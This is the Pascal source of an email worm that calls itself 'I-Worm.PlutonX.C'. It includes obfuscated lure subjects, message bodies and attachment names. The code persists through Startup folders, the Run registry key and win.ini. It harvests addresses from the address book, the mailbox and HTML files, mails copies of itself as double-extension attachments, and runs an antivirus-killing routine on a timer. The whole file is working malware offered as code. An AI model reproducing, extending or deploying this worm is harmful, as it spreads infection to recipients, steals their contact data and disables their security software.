PROGRAM PlutonX;

USES
  sClasses IN 'ACLUnits\SCLASSES.PAS',
  Registry IN 'ACLUnits\REGISTRY.PAS',
  IniFiles IN 'ACLUnits\INIFILES.PAS',
  AclUtils IN 'ACLUnits\ACLUTILS.PAS',
  P2P      IN 'P2P.PAS',
  KillAV   IN 'KILLAV.PAS',
  LAN      IN 'LAN.PAS',
  Utils    IN 'UTILS.PAS',
  Email    IN 'EMAIL.PAS',
  GetProc  IN 'GETPROC.PAS',
  Windows;

VAR
  Emails                : TStrings;
  Msg                   : TMsg;
  hMutex                : THandle;
  ApplicationHandle     : HWND;
  SendMailBusy          : BOOL;
  WABExists             : BOOL;
  PlutonxRegKey         : STRING;
  Extensions1           : XArray;
  Extensions2           : XArray;
  Bodys                 : XArray;
  ErrorMessages         : XArray;
  Attachments           : XArray;
  Subjects              : XArray;
  SentEmail             : WORD;
  NumberOfExtensions1   : WORD;
  NumberOfExtensions2   : WORD;
  NumberOfBodys         : WORD;
  NumberOfErrorMessages : WORD;
  NumberOfAttachments   : WORD;
  NumberOfSubjects      : WORD;
  r1,r2,r3:pchar;

CONST

  TExtensions1 : pChar =
                    #200+#211+#199+#144+#209+#212+#151+#144+#220+#208+#215+#144+
                    #219+#197+#218+#144+#216+#220+#216+#144+#206+#212+#203+#144+
                    #203+#205+#202+#144+#200+#197+#216+#144+#198+#209+#212+#144+
                    #204+#216+#209+#144+#209+#212+#203+#144+#209+#200+#198+#144+
                    #222+#205+#212;

  TExtensions2 : pChar =
                    #212+#205+#202+#144+#198+#197+#216+#144+#215+#199+#214;

  TBodys : pChar =
                    #167+#204+#201+#199+#207+#132+#216+#204+#201+#132+#197+#216+
                    #216+#197+#199+#204+#209+#201+#210+#216+#133+#144+#183+#201+
                    #201+#132+#216+#204+#201+#132+#197+#216+#216+#197+#199+#204+
                    #201+#209+#201+#210+#216+#133+#144+#169+#210+#206+#211+#221+
                    #132+#216+#204+#201+#132+#197+#216+#216+#197+#199+#204+#201+
                    #209+#201+#210+#216+#133+#144+#177+#211+#214+#201+#132+#200+
                    #201+#216+#197+#205+#208+#215+#132+#197+#216+#216+#197+#199+
                    #204+#201+#200+#133+#144+#172+#205+#113+#110+#113+#110+#167+
                    #204+#201+#199+#207+#132+#216+#204+#201+#132+#165+#216+#216+
                    #197+#199+#204+#201+#209+#201+#210+#216+#132+#146+#146+#113+
                    #110+#113+#110+#183+#201+#201+#132+#217+#144+#172+#205+#113+
                    #110+#113+#110+#167+#204+#201+#199+#207+#132+#216+#204+#201+
                    #132+#165+#216+#216+#197+#199+#204+#201+#209+#201+#210+#216+
                    #132+#146+#146+#144+#165+#216+#216+#197+#199+#204+#201+#200+
                    #132+#211+#210+#201+#132+#171+#205+#202+#216+#132+#202+#211+
                    #214+#132+#217+#146+#146+#144+#187+#179+#187+#132+#167+#172+
                    #169+#167+#175+#132+#184+#172+#173+#183+#133;

  TErrorMessages : pChar =
                    #184+#204+#205+#215+#132+#170+#205+#208+#201+#132+#205+#215+
                    #132+#167+#211+#214+#214+#217+#212+#216+#201+#200+#133+#144+
                    #184+#204+#205+#215+#132+#183+#211+#202+#216+#219+#197+#214+
                    #201+#132+#210+#201+#201+#200+#132+#209+#211+#214+#201+#132+
                    #218+#205+#214+#216+#217+#197+#208+#132+#209+#201+#209+#211+
                    #214+#221+#133+#144+#169+#214+#214+#211+#214+#158+#132+#176+
                    #211+#219+#132+#183+#221+#215+#216+#201+#209+#132+#180+#201+
                    #214+#202+#211+#214+#209+#197+#210+#199+#201+#133+#144+#169+
                    #214+#214+#211+#214+#158+#132+#167+#197+#210+#132+#178+#211+
                    #216+#132+#170+#205+#210+#200+#132+#167+#211+#210+#202+#205+
                    #203+#146+#173+#178+#173+#133+#144+#184+#204+#205+#215+#132+
                    #215+#211+#202+#216+#219+#197+#214+#201+#132+#210+#201+#201+
                    #200+#132+#177+#183+#173+#179+#151+#150+#146+#168+#176+#176+
                    #133+#144+#165+#212+#212+#208+#205+#199+#197+#216+#205+#211+
                    #210+#132+#197+#216+#216+#201+#209+#212+#216+#201+#200+#132+
                    #216+#211+#132+#214+#201+#197+#200+#132+#209+#201+#209+#211+
                    #214+#221+#132+#197+#216+#132+#148+#220+#170+#170+#170+#170+
                    #170+#170+#170+#170+#204+#133+#144+#184+#204+#201+#132+#215+
                    #221+#215+#216+#201+#209+#132+#199+#197+#210+#210+#211+#216+
                    #132+#202+#205+#210+#200+#132+#216+#204+#201+#132+#202+#205+
                    #208+#201+#132+#215+#212+#201+#199+#205+#202+#205+#201+#200+
                    #146+#144+#183+#216+#197+#199+#207+#132+#211+#218+#201+#214+
                    #202+#208+#211+#219+#146+#144+#167+#197+#210+#210+#211+#216+
                    #132+#197+#208+#208+#211+#199+#197+#216+#201+#132+#209+#201+
                    #209+#211+#214+#221+#146+#144+#165+#132+#202+#197+#216+#197+
                    #208+#132+#201+#220+#199+#201+#212+#216+#205+#211+#210+#132+
                    #148+#154+#132+#204+#197+#215+#132+#211+#199+#199+#217+#214+
                    #214+#201+#200+#132+#197+#216+#132+#160+#165+#157+#148+#148+
                    #162+#158+#160+#165+#148+#157+#155+#151+#166+#170+#168+#162+
                    #146+#144+#170+#197+#216+#197+#208+#132+#169+#220+#199+#201+
                    #212+#216+#205+#211+#210+#132+#148+#169+#132+#204+#197+#215+
                    #132+#211+#199+#199+#217+#214+#214+#201+#200+#132+#197+#216+
                    #132+#209+#201+#209+#211+#214+#221+#132+#197+#200+#200+#214+
                    #201+#215+#215+#132+#205+#210+#132+#209+#211+#200+#217+#208+
                    #201+#132+#186+#220+#200+#132+#173+#179+#183+#140+#148+#152+
                    #141+#132+#143+#132+#209+#201+#209+#211+#214+#221+#132+#197+
                    #200+#200+#214+#201+#215+#215+#146+#144+#165+#132+#202+#197+
                    #216+#197+#208+#132+#201+#220+#199+#201+#212+#216+#205+#211+
                    #210+#132+#148+#169+#132+#204+#197+#215+#132+#211+#199+#199+
                    #217+#214+#214+#201+#200+#132+#197+#216+#132+#148+#148+#150+
                    #156+#158+#167+#148+#150+#165+#148+#150+#148+#149+#132+#205+
                    #210+#132+#186+#188+#168+#132+#173+#179+#183+#140+#148+#152+
                    #141+#143+#148+#148+#148+#148+#149+#170+#167+#157;

  TAttachments : pChar =
                    #215+#199+#214+#201+#201+#210+#215+#197+#218+#201+#214+#144+
                    #215+#199+#214+#201+#201+#210+#215+#197+#218+#201+#214+#152+
                    #217+#144+#215+#199+#214+#201+#201+#210+#215+#197+#218+#201+
                    #214+#152+#217+#144+#215+#199+#214+#201+#201+#210+#215+#197+
                    #218+#201+#214+#202+#211+#214+#217+#144+#202+#214+#201+#201+
                    #215+#199+#214+#201+#201+#210+#215+#197+#218+#201+#214+#144+
                    #208+#211+#218+#201+#144+#208+#211+#218+#201+#214+#215+#144+
                    #208+#211+#218+#201+#215+#199+#214+#144+#208+#211+#218+#201+
                    #214+#215+#199+#214+#201+#201+#210+#215+#197+#218+#201+#214+
                    #144+#208+#211+#218+#201+#214+#215+#203+#197+#210+#203+#144+
                    #208+#211+#218+#201+#215+#204+#211+#214+#201+#144+#208+#211+
                    #218+#201+#152+#217+#144+#208+#211+#218+#201+#214+#215+#144+
                    #201+#210+#206+#211+#221+#208+#211+#218+#201+#144+#215+#204+
                    #197+#214+#201+#208+#211+#218+#201+#144+#215+#204+#197+#214+
                    #201+#205+#216+#144+#199+#204+#201+#199+#207+#202+#214+#205+
                    #201+#210+#200+#215+#144+#217+#214+#202+#214+#205+#201+#210+
                    #200+#144+#202+#214+#205+#201+#210+#200+#215+#199+#205+#214+
                    #199+#208+#201+#144+#202+#214+#205+#201+#210+#200+#215+#204+
                    #205+#212+#144+#202+#214+#205+#201+#210+#200+#215+#144+#202+
                    #214+#205+#201+#210+#200+#215+#199+#214+#144+#202+#214+#205+
                    #201+#210+#200+#215+#144+#202+#214+#205+#201+#210+#200+#215+
                    #152+#217+#144+#202+#214+#205+#201+#210+#200+#215+#204+#205+
                    #212+#152+#217+#144+#202+#214+#205+#201+#210+#200+#215+#204+
                    #205+#212+#198+#205+#214+#200+#144+#202+#214+#205+#201+#210+
                    #200+#215+#204+#205+#212+#202+#211+#214+#217+#144+#202+#214+
                    #205+#201+#210+#200+#215+#219+#211+#214+#208+#200+#144+#219+
                    #201+#214+#202+#214+#205+#201+#210+#200+#215+#144+#212+#197+
                    #215+#215+#205+#211+#210+#144+#198+#217+#208+#208+#215+#204+
                    #205+#216+#215+#199+#214+#144+#215+#204+#197+#207+#201+#205+
                    #216+#144+#215+#204+#197+#207+#201+#215+#199+#214+#144+#215+
                    #204+#197+#207+#205+#210+#203+#208+#211+#218+#201+#144+#215+
                    #204+#197+#207+#205+#210+#203+#202+#214+#205+#201+#210+#200+
                    #215+#204+#205+#212+#144+#212+#197+#215+#215+#205+#211+#210+
                    #217+#212+#144+#214+#205+#215+#204+#216+#204+#197+#144+#203+
                    #214+#201+#201+#216+#205+#210+#203+#215+#144+#208+#211+#218+
                    #201+#203+#214+#201+#201+#216+#205+#210+#203+#215+#144+#202+
                    #214+#205+#201+#210+#200+#215+#203+#214+#201+#201+#216+#205+
                    #210+#203+#215+#144+#202+#214+#205+#201+#210+#200+#215+#201+
                    #197+#214+#199+#204+#144+#208+#211+#218+#201+#202+#205+#210+
                    #200+#201+#214+#144+#216+#214+#217+#201+#202+#214+#205+#201+
                    #210+#200+#215+#144+#216+#214+#217+#201+#208+#211+#218+#201+
                    #214+#215+#144+#202+#217+#199+#207+#201+#214;

  TSubjects : pChar =
                    #171+#214+#201+#201+#216+#215+#133+#133+#144+#171+#201+#216+
                    #132+#156+#132+#170+#182+#169+#169+#132+#205+#215+#215+#217+
                    #201+#215+#132+#145+#132+#210+#211+#132+#214+#205+#215+#207+
                    #133+#133+#144+#172+#205+#133+#144+#189+#211+#217+#214+#132+
                    #178+#201+#219+#215+#132+#165+#208+#201+#214+#216+#133+#133+
                    #144+#136+#149+#153+#148+#132+#170+#182+#169+#169+#132+#166+
                    #211+#210+#217+#215+#133+#133+#144+#189+#211+#217+#214+#132+
                    #171+#205+#202+#216+#133+#144+#178+#201+#219+#132+#198+#211+
                    #210+#217+#215+#132+#205+#210+#132+#221+#211+#217+#214+#132+
                    #199+#197+#215+#204+#132+#197+#199+#199+#211+#217+#210+#216+
                    #133+#144+#184+#211+#211+#208+#215+#132+#170+#211+#214+#132+
                    #189+#211+#217+#214+#132+#179+#210+#208+#205+#210+#201+#132+
                    #166+#217+#215+#205+#210+#201+#215+#215+#133+#144+#168+#197+
                    #205+#208+#221+#132+#169+#209+#197+#205+#208+#132+#182+#201+
                    #209+#205+#210+#200+#201+#214+#133+#144+#178+#201+#219+#215+
                    #144+#170+#214+#201+#201+#132+#183+#204+#205+#212+#212+#205+
                    #210+#203+#133+#144+#173+#216+#215+#132+#169+#197+#215+#221+
                    #133+#144+#187+#197+#214+#210+#205+#210+#203+#133+#144+#183+
                    #167+#165+#177+#132+#197+#208+#201+#214+#216+#133+#133+#133+
                    #144+#183+#212+#211+#210+#215+#211+#214+#215+#132+#210+#201+
                    #201+#200+#201+#200+#133+#144+#178+#201+#219+#132+#182+#201+
                    #197+#200+#205+#210+#203+#144+#167+#165+#176+#176+#132+#170+
                    #179+#182+#132+#173+#178+#170+#179+#182+#177+#165+#184+#173+
                    #179+#178+#133+#144+#150+#153+#132+#209+#201+#214+#199+#204+
                    #197+#210+#216+#215+#132+#197+#210+#200+#132+#214+#205+#215+
                    #205+#210+#203+#133+#144+#167+#211+#219+#215+#144+#177+#221+
                    #132+#201+#166+#197+#221+#132+#197+#200+#215+#133+#144+#169+
                    #209+#212+#216+#221+#132+#197+#199+#199+#211+#217+#210+#216+
                    #133+#144+#177+#197+#214+#207+#201+#216+#132+#185+#212+#200+
                    #197+#216+#201+#132+#182+#201+#212+#211+#214+#216+#133+#144+
                    #167+#208+#205+#199+#207+#132+#211+#210+#132+#216+#204+#205+
                    #215+#133+#144+#170+#197+#210+#216+#197+#215+#216+#205+#199+
                    #133+#144+#187+#211+#219+#133+#144+#166+#197+#200+#132+#210+
                    #201+#219+#215+#133+#133+#144+#176+#211+#215+#216+#132+#138+
                    #132+#170+#211+#217+#210+#200+#133+#144+#178+#201+#219+#132+
                    #167+#211+#210+#216+#201+#215+#216+#215+#133+#144+#184+#211+
                    #200+#197+#221+#132+#179+#210+#208+#221+#133+#133+#144+#171+
                    #201+#216+#132+#197+#132+#170+#182+#169+#169+#132+#203+#205+
                    #202+#216+#133+#144+#177+#201+#209+#198+#201+#214+#215+#204+
                    #205+#212+#132+#167+#211+#210+#202+#205+#214+#209+#197+#216+
                    #205+#211+#210+#144+#182+#201+#212+#211+#214+#216+#144+#180+
                    #208+#201+#197+#215+#201+#132+#172+#201+#208+#212+#146+#146+
                    #146+#144+#183+#216+#197+#216+#215+#144+#173+#132+#210+#201+
                    #201+#200+#132+#204+#201+#208+#212+#132+#197+#198+#211+#217+
                    #216+#132+#215+#199+#214+#205+#212+#216+#133+#133+#133+#144+
                    #173+#210+#216+#201+#214+#201+#215+#216+#205+#210+#203+#146+
                    #146+#146+#144+#173+#210+#216+#214+#211+#200+#217+#199+#216+
                    #205+#211+#210+#144+#186+#197+#214+#205+#211+#217+#215+#133+
                    #144+#165+#210+#210+#211+#217+#210+#199+#201+#209+#201+#210+
                    #216+#133+#144+#172+#205+#215+#216+#211+#214+#221+#132+#215+
                    #199+#214+#201+#201+#210+#133+#144+#167+#211+#214+#214+#201+
                    #199+#216+#205+#211+#210+#132+#211+#202+#132+#201+#214+#214+
                    #211+#214+#215+#133+#144+#174+#217+#215+#216+#132+#197+#132+
                    #214+#201+#209+#205+#210+#200+#201+#214+#133+#144+#180+#197+
                    #221+#209+#201+#210+#216+#132+#210+#211+#216+#205+#199+#201+
                    #215+#133;

FUNCTION RandomFileName : STRING;
VAR
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    RESULT:=RESULT+Chars[Random(61)+1];
  UNTIL Length(RESULT)=FileNameLength;
  RESULT:=RESULT+'.exe';
END;

PROCEDURE InfectStartUpDir;
VAR
  S : STRING;
  O : STRING;
BEGIN
  O:=SoftwareMic+'Windows\CurrentVersion\explorer\Shell Folders';
  
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(O,True);
  S:=Reg.ReadString('Startup')+'\';
  IF S<>'' THEN CopyFiles(True,S+RandomFileName);
  Reg.CloseKey;

  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(O,True);
  S:=Reg.ReadString('Common Startup')+'\';                                      //"Common Startup"
  IF S<>'' THEN CopyFiles(True,S+RandomFileName);
  Reg.CloseKey;
END;

PROCEDURE WinIni;
VAR
  IniFile : TIniFile;
BEGIN
  IniFile:=TIniFile.Create('win.ini');
  IniFile.WriteString('Windows','Run','rundll32_.exe');
  IniFile.Free;
END;

PROCEDURE RegWinStart;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+'Windows\CurrentVersion\Run',True);
  S:=AVName[Random(NumberOfAVNames)];
  IF Pos('.',S)>0 THEN SetLength(S,Pos('.',S)-1);
  Reg.WriteString(S,Winpath+RandomFileName);
  Reg.CloseKey;
  CopyFiles(True,Winpath+RandomFileName);
END;

PROCEDURE QuickSort(Left,Right:WORD);
VAR
  Up,Down : WORD;
  Compare : STRING;
BEGIN
  Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right) DIV 2];
  REPEAT
    WHILE Emails.Strings[Up]<Compare DO Inc(Up);
    WHILE Compare<Emails.Strings[Down] DO Dec(Down);
    IF Up<=Down THEN BEGIN
      Emails.Exchange(Up,Down);
      Inc(Up);Dec(Down);
    END;
  UNTIL Up>Down;
  IF Left<Down THEN QuickSort(Left,Down);
  IF Up<Right  THEN QuickSort(Up,Right);
END;

PROCEDURE KillDupes;
VAR
  I : DWORD;
BEGIN
  FOR I:=Emails.Count-2 DOWNTO 0 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
END;

FUNCTION GetPlutonXRegKey : STRING;
VAR
  I    : DWORD;
  O    : WORD;
  Keys : TStrings;
  S    : STRING;
BEGIN
  Keys:=TStringList.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\SOFTWARE',False);
  Reg.GetKeyNames(Keys);

  FOR I:=0 TO Keys.Count-1 DO
    FOR O:=1 TO NumberOfAVNames DO
      IF(Keys.Strings[I]=Copy(AVName[O],1,Pos('.',AVName[O])-1))AND(Reg.KeyExists(Keys.Strings[I]))AND(Keys.Strings[I]<>'') THEN BEGIN
        Reg.OpenKey(Software+Keys.Strings[I],False);
        IF(Reg.ValueExists('Sent'))AND(Reg.ValueExists('email_num')) THEN S:=Keys.Strings[I];
      END;

  RESULT:=S;
  IF S='' THEN BEGIN
    RESULT:=AVName[Random(NumberOfAVNames-1)+1];
    IF (POS('.',RESULT)>0) THEN SetLength(RESULT,Pos('.',RESULT)-1);
  END;

  Keys.Free;
  Reg.CloseKey;
END;

PROCEDURE ReadWAB;
VAR
  WABFile : FILE;
  b,g     : DWORD;
  i       : STRING;
  n       : ARRAY[1..5] OF Char;
  xx      : ARRAY[1..500] OF Char;
  rr      : WORD;
  WABPath : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(SoftwareMic+'WAB\WAB4\WAB File Name',False);
  WABPath:=Reg.ReadString('');
  IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
    WABExists:=True;
    Assign(WABFile,WABPath);
    Reset(WABFile,1);
    Seek(WABFile,176199);
    REPEAT
      BlockRead(WABFile,N,5);
      IF N[1]+N[2]+N[3]+N[4]=#01#31#00#03 THEN BEGIN
        BlockRead(WABFile,XX,Ord(N[5])+30);
        I:='';
        FOR RR:=1 TO Ord(N[5])+30 DO I:=I+XX[RR];
        Delete(I,1,3);
        G:=Pos(#00#00#00,I);
        IF G>0 THEN Delete(I,G,Length(I)-G+1);
        FOR B:=1 TO Ord(N[5]) DO IF I[B]=#00 THEN Delete(I,B,1);
        IF (Pos('@',I)>0)AND(I[1]<>'/') THEN Emails.ADD(UpperCase(I));
      END ELSE Seek(WABFile,FilePos(WABFile)-4);
    UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
    QuickSort(1,Emails.Count-1);
    KillDupes;
  END;
  IF NOT FileExists(WABPath) THEN WABExists:=False;
  Close(WABFile);
  Reg.CloseKey;
END;

PROCEDURE WriteEmailsReg;
VAR
  I : DWORD;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(Software+PlutonXRegKey,True);
  FOR I:=0 TO Emails.Count-1 DO Reg.WriteString(IntToStr(I),Emails.Strings[I]);
  Reg.WriteInteger('email_num',Emails.Count);
  Reg.WriteInteger('Sent',SenteMail);
  Reg.CloseKey;
END;

PROCEDURE ReadEmailsReg;
VAR
  I : DWORD;
BEGIN
  Emails.Add(PlutonXX);
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.OpenKey(Software+PlutonXRegKey,False) THEN
    FOR I:=0 TO Reg.ReadInteger('email_num')-1 DO Emails.Add(Reg.ReadString(IntToStr(I)));
  Reg.CloseKey;
END;

PROCEDURE GetNumberOfSentEmails;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.KeyExists(Software+PlutonXRegKey) THEN BEGIN
    Reg.OpenKey(Software+PlutonXRegKey,True);
    SentEmail:=Reg.ReadInteger('Sent');
  END ELSE SentEmail:=0;
  Reg.CloseKey;
END;

FUNCTION GetFirstRun : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software',false);
  RESULT:= NOT Reg.KeyExists(PlutonXRegKey);
  Reg.CreateKey(PlutonxRegKey);
  Reg.CloseKey;
END;

PROCEDURE ReadInbox;
VAR
  OSInfo                    : TOSVersionInfo;
  MAPIMessage               : TMAPIMessage;
  lppMapiMessage            : PMapiMessage;
  MError                    : Cardinal;
  MapiSession               : DWORD;
  bFindFirst                : BOOL;
  ProfileName               : STRING;
  sSeedMessageID,sMessageID : lpup;
  I                         : BYTE;
BEGIN
  OSInfo.dwOSVersionInfoSize:=SizeOf(OSInfo);
  GetVersionEx(OSInfo);
  Reg.RootKey:=HKEY_CURRENT_USER;
  IF OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN BEGIN
    Reg.OpenKey(SoftwareMic+'Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END ELSE BEGIN
    Reg.OpenKey(SoftwareMic+'Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END;
  TRY
    MError:=MapiLogOn(0,PChar(ProfileName),NIL,MAPI_NEW_SESSION,0,MapiSession);
    IF (MError<>SUCCESS_SUCCESS) THEN Exit;
  EXCEPT
    ;
  END;
  bFindFirst:=True;
  FOR I:=1 TO 50 DO TRY
    IF bFindFirst THEN bFindFirst:=False ELSE sSeedMessageID:=sMessageID;
    MError:=MapiFindNext(MapiSession,0,NIL,sSeedMessageID,0,0,sMessageID);
    IF MError=SUCCESS_SUCCESS THEN BEGIN
      lppMapiMessage:=@MAPIMessage;
      MError:=MAPIReadMail(MAPISession,0,@sMessageID,MAPI_ENVELOPE_ONLY,0,lppMapiMessage);
      IF (MError=SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN Emails.Add(UpperCase(lppMapiMessage.lpOriginator.lpszAddress));
    END;
  EXCEPT
  END;
  QuickSort(1,Emails.Count-1);
  KillDupes;
  WriteEmailsReg;
  TRY
    MapiLogOff(MapiSession,0,0,0);
  EXCEPT
    ;
  END;
  Reg.CloseKey;
END;

PROCEDURE SendEmail;
VAR
  S : STRING;
BEGIN
  IF (InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
    SendMailBusy:=True;
    Inc(SentEmail);
    IF SentEmail>Emails.Count-1 THEN SentEmail:=1;
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKey(Software+PlutonXRegKey,True);
    Reg.WriteInteger('Sent',SentEmail);
    Reg.CloseKey;
    S:=Attachments[Random(NumberOfAttachments-1)+1]+'.'+Extensions1[Random(NumberOfExtensions1-1)+1]+'.'+Extensions2[Random(NumberOfExtensions2-1)+1];
    CopyFiles(True,WinPath+S);
    TRY
      IF SentEmail>0 THEN Email.SendEmail(Subjects[Random(NumberOfSubjects-1)+1],Bodys[Random(NumberOfBodys-1)+1],Emails[SentEmail],WinPath,S);
      IF FileExists(WinPath+S) THEN DeleteFile(pChar(WinPath+S));
    EXCEPT
    END;
  END;
  SendMailBusy:=False;
END;

PROCEDURE ClearEmail(S:STRING);
VAR
  B : WORD;
  C : STRING;
BEGIN
  FOR B:=Pos('@',S)+1 TO Length(S) DO
    IF ((S[B]<'a')OR(S[B]>'z'))AND((S[B]<'0')OR(S[B]>'9'))AND((S[B]<'A')OR(S[B]>'Z'))AND(S[B]<>'.')AND(S[B]<>'-')AND(S[B]<>'_') THEN BEGIN
      Delete(S,B,Length(S));
      Break;
    END;
    C:=Copy(S,1,1);
  IF ((C>='A')AND(C<='Z'))OR((C>='a')AND(C<='z')) THEN
  IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
END;

PROCEDURE FindMail(EFile:AnsiString);
VAR
  F : TextFile;
  I : WORD;
BEGIN
  IF FileExists(EFile) THEN BEGIN
    AssignFile(F,EFile);
    Reset(F);
    REPEAT
      ReadLn(F,EFile);
      EFile:=UpperCase(EFile);
      I:=Pos('LTO:',EFile);
      IF I>0 THEN BEGIN
        Delete(EFile,1,I+3);
        I:=Pos('"',EFile);
        IF I>0 THEN Delete(EFile,I,Length(EFile));
        ClearEmail(EFile);
      END;
    UNTIL EOF(F);
    CloseFile(F);
  END;
END;

PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
VAR
  D     : TSearchRec;
  Error : Integer;
BEGIN
  Error:=FindFirst(Path+fSpec,faAnyFile,D);
  WHILE Error=0 DO BEGIN
    FindMail(Path+D.Name);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE SearchAllDir;
VAR
  I : BYTE;
BEGIN
  FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
END;

PROCEDURE CopyInfectedFiles;
BEGIN
  CopyFiles(True,Winpath+'rundll32_.exe');
  InfectStartUpDir;
END;

PROCEDURE DelRegedit;
BEGIN
  IF FileExists(WinPath+'regedit.exe') THEN DeleteFile(pChar(WinPath+'regedit.exe'));
END;

PROCEDURE InitTimers;
BEGIN
//  SetTimer(ApplicationHandle,2,60000,@SendEmail);
  SetTimer(ApplicationHandle,3,4000,@KillAV.AVKiller);
END;

PROCEDURE StartWorm;
VAR
  FirstRun : BOOL;
BEGIN
  PlutonXX:='I-Worm.PlutonX.C';
  Software:='\SOFTWARE\';
  SoftwareMic:='\SOFTWARE\Microsoft\';
  InitProcesses;
  InitEmailProcesses;
  NumberOfExtensions1:=DecodeStrings(TExtensions1,Extensions1);
  NumberOfExtensions2:=DecodeStrings(TExtensions2,Extensions2);
  NumberOfBodys:=DecodeStrings(TBodys,Bodys);
  NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
  NumberOfAttachments:=DecodeStrings(TAttachments,Attachments);
  NumberOfSubjects:=DecodeStrings(TSubjects,Subjects);
  NumberOfAVNames:=DecodeStrings(TAVName,AVName);
  ApplicationHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
  SetWinPath;
//  DelRegedit;
  SendMailBusy:=False;
  Randomize;
  Reg:=TRegistry.Create;
//  PlutonXRegKey:=GetPlutonxRegKey;
  Emails:=TStringList.Create;
  KillAV.AVKiller;
{ FirstRun:=GetFirstRun;
  IF FirstRun THEN IF Pos('STARTUP',UpperCase(Paramstr(0)))=0 THEN MessageBox(ApplicationHandle,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND)
  ELSE InitTimers;
  InitPeerToPeer;
  CopyInfectedFiles;
  WinIni;
  IF FirstRun THEN BEGIN
    RegWinStart;
    Emails.Add(PlutonXX);
    SearchAllDir;
    ReadWab;
    ReadInBox;
  END ELSE BEGIN
    GetNumberOfSentEmails;
    ReadEmailsReg;
    ReadInBox;
  END;
  hThread:=BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);}
END;

BEGIN
  hMutex:=CreateMutexA(NIL,False,PlutonXX);
  IF WaitForSingleObject(hMutex,0)<>Wait_TimeOut THEN StartWorm;
  WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
END.
